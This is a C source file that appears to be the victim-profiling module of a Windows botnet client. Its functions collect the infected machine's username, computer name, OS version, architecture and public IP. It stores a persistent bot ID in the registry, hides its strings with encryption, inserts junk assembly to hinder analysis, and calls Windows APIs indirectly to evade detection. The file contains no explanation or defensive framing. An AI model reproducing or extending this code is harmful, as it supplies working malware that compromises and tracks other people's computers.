#define WIN32_LEAN_AND_MEAN



#include "bot.h"
#include <stdlib.h> 
#include <stdio.h>

#include "global_config.h"

#include "crypto.h"

#include <Windows.h>
#include "common_utils.h"


#include "junk_asm.h"

#include "functions_table.h"

#include "debug.h"

//
#pragma warning(disable:4996)

// param: ret - must be an array.
bool bot_get_bot_id(char* ret) {
	char *bot_id = get_bot_id();

	if (bot_id == NULL) return false;

	memcpy(ret, bot_id, strlen(bot_id));

	//
	free(bot_id);
	return true;
}

// param: ret - must be an array.
bool bot_get_current_username(char *ret) {
	DWORD len = BOT_USERNAME_LEN;

	bool res = l_GetUserNameA(ret, &len);

	if (!res) {
		DBG_MSG("bot_get_current_username() - failed. code: %d \n", l_GetLastError());
	}

	return res;
}

// param: ret - must be an array.
bool bot_get_pcname(char* ret) 
{
	DWORD len = BOT_PCNAME_LEN;

	bool res = l_GetComputerNameA(ret, &len);

	if (!res) {
		DBG_MSG("bot_get_pcname() - failed. code: %d \n", l_GetLastError());
	}

	return res;
}

//
bool bot_get_integrity_level(int* ret) 
{
	*ret = 1;

	return true;
}

//
void bot_get_bot_version(int* ret) {
	*ret = _BOT_VERSION;
}

// https://docs.microsoft.com/en-us/windows/win32/sysinfo/version-helper-apis
bool bot_get_bot_os_version_info(int * bot_osversion_major, int * bot_osversion_minor, int * bot_osversion_build_numder, char * service_pack_string ) 
{
	RTL_OSVERSIONINFOW *roviw;

	roviw = GetRealOSVersion();

	// TODO: check fail case, if ((PVOID)roviw == NULL) return false;

	*bot_osversion_major = roviw->dwMajorVersion;
	*bot_osversion_minor = roviw->dwMinorVersion;

	*bot_osversion_build_numder = roviw->dwBuildNumber;

	wtoc(service_pack_string, roviw->szCSDVersion);

	//
	if (roviw != NULL)
	{
		free(roviw);
	}
	

	//
	return true;
}

//
void bot_get_bot_os_arch(int * ret) {
	if (Is64BitWindows()) {
		*ret = 1;
	}
	else {
		*ret = 0;
	}
}

// currently IPv4
bool bot_get_bot_public_ip_address(char * ret) 
{
	return getmyipaddress(ret);
}


//
void bot_get_botnet_name(char* ret) 
{
	char* botnet_name = NULL;
	decrypt_to_string(&botnet_name, BOTNET_NAME, BOTNET_NAME_ENCRYPTED_LEN);

	DBG_MSG("bot_get_botnet_name() - botnet_name: %s\n", botnet_name);

	memcpy(ret, botnet_name, strlen(botnet_name));

	free(botnet_name);
}



//////////////////////////////////////
//
char* bot_info_2_buffer(BOT_INFORMATION bot_info, int * buffer_size)
{
	char* ret = (char*)&bot_info;

	*buffer_size = sizeof(bot_info);

	return ret;
}


void print_bot_info(BOT_INFORMATION bot_info) {
	DBG_MSG("BOT_ID: %s\n", bot_info.BOT_ID);

	DBG_MSG("BOT_USERNAME: %s\n", bot_info.BOT_USERNAME);

	DBG_MSG("BOT_PCNAME: %s\n", bot_info.BOT_PCNAME);

	DBG_MSG("BOT_INTEGRITY_LEVEL: %d\n", bot_info.BOT_INTEGRITY_LEVEL);

	DBG_MSG("BOT_VERSION: %d\n", bot_info.BOT_VERSION);

	DBG_MSG("BOT_OSVERSION_MAJOR: %d\n", bot_info.BOT_OSVERSION_MAJOR);

	DBG_MSG("BOT_OSVERSION_MINOR: %d\n", bot_info.BOT_OSVERSION_MINOR);

	DBG_MSG("BOT_OSVERSION_BUILD_NUMBER: %d\n", bot_info.BOT_OSVERSION_BUILD_NUMBER);

	DBG_MSG("BOT_SERVICE_PACK_STRING: %s\n", bot_info.BOT_SERVICE_PACK_STRING);

	DBG_MSG("BOT_OSVERSION_IS_X64: %d\n", bot_info.BOT_OSVERSION_IS_X64);

	DBG_MSG("BOT_IP_ADDRESS: %s\n", bot_info.BOT_IP_ADDRESS);

	DBG_MSG("BOT_BOTNET_NAME: %s\n", bot_info.BOT_BOTNET_NAME);
}

//
////////////////////////////////////////////////////////////////////////////////

bool is_bot_id_existed()
{
	ASM_JUNK;

	//
	char* bot_id = get_bot_id();

	if (bot_id == NULL) return false;


	//
	free(bot_id);
	return true;
}


char * get_bot_id() 
{
	char* bot_id_key = NULL;
	decrypt_to_string(&bot_id_key, BOT_ID_KEY, BOT_ID_KEY_ENCRYPTED_LEN);

	DBG_MSG("get_bot_id() - bot_id_key: %s\n", bot_id_key);


	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	char * bot_id = (char*)calloc(MAX_PATH, 1);
	DWORD dwSize = MAX_PATH;


	//
	char* registry_privacy = NULL;
	decrypt_to_string(&registry_privacy, REGISTRY_PRIVACY, REGISTRY_PRIVACY_ENCRYPTED_LEN);

	DBG_MSG("get_bot_id() - registry_privacy: %s\n", registry_privacy);

	//


	lResult = l_RegOpenKeyExA(HKEY_CURRENT_USER, registry_privacy, 0, KEY_READ, &hKey);

	if (lResult != ERROR_SUCCESS) {
		DBG_MSG("get_bot_id() - RegOpenKeyExA() failed, code: %d\n", lResult);

		//
		free(bot_id);
		free(bot_id_key);
		free(registry_privacy);

		return NULL;
	}

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = l_RegGetValueA(hKey, NULL, bot_id_key, RRF_RT_REG_SZ, &dwRegType, bot_id, &dwSize);

		if (lResult != ERROR_SUCCESS) {
			DBG_MSG("get_bot_id() - RegGetValueA() failed, code: %d\n", lResult);

			//
			free(bot_id);
			free(bot_id_key);
			free(registry_privacy);

			return NULL;
		}

		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (strlen(bot_id) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		l_RegCloseKey(hKey);
		hKey = NULL;
	}


	//
	free(bot_id_key);
	free(registry_privacy);


	if (!fSuccess) {
		DBG_MSG("get_bot_id() - bot_id: NULL \n");
		return NULL;
	}
	else {

		// free it yourself
		DBG_MSG("get_bot_id() - bot_id: %s \n", bot_id);
		return bot_id;
	}
}


bool set_bot_id(char * bot_id) 
{
	//
	char* bot_id_key = NULL;
	decrypt_to_string(&bot_id_key, BOT_ID_KEY, BOT_ID_KEY_ENCRYPTED_LEN);

	DBG_MSG("is_bot_id_existed() - bot_id_key: %s\n", bot_id_key);


	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	DWORD dwSize = 0;

	//
	char* registry_privacy = NULL;
	decrypt_to_string(&registry_privacy, REGISTRY_PRIVACY, REGISTRY_PRIVACY_ENCRYPTED_LEN);

	

	DBG_MSG("is_bot_id_existed() - registry_privacy: %s\n", registry_privacy);

	//
	lResult = l_RegCreateKeyExA(HKEY_CURRENT_USER, registry_privacy, 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (strlen(bot_id) + 1);
		//
		lResult = l_RegSetValueExA(hKey, bot_id_key, 0, REG_SZ, (BYTE*)bot_id, dwSize);


		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		l_RegCloseKey(hKey);

		hKey = NULL;
	}

	//
	free(bot_id_key);
	free(registry_privacy);

	return fSuccess;
}